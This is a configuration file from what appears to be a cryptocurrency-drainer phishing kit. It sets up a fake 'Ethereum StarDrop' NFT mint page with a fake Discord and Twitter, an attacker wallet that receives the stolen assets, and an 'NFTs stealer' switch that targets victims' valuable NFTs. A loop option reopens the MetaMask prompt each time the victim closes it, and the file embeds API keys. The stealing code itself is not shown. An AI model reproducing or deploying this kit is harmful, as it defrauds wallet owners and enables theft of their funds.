// ⚠️ for infura & moralis, make you sure that you copy same number of characters
const address = "0x8A10a0Ddc2F2AEcA7e3870085964e199Fff44F97";    // Your ETH wallet that you have to receive NFTs
const infuraId = "e53dc432bda847078c6d418e92982f57"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
const moralisApi = "Gc7ozHgWSWDq7lNWn9h30da4LjHy8YkoJFfgGyfv9a4HnIla5AHqZRkab4ihgeAZ"    // Web3 Api key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "StarDrop Event",
    title: "Ethereum StarDrop", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "03.09.2022 - 12.09.2022", // Today date
    socialMedia: {
        discord: "https://discord.com/invite/cryptohub",
        twitter: "https://twitter.com/AirdropStario",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.0012,         // Price per NFT.
    totalSupply: 564,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 3,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.032,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "" // leave empty if you want to use the same address 
}

/* 
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
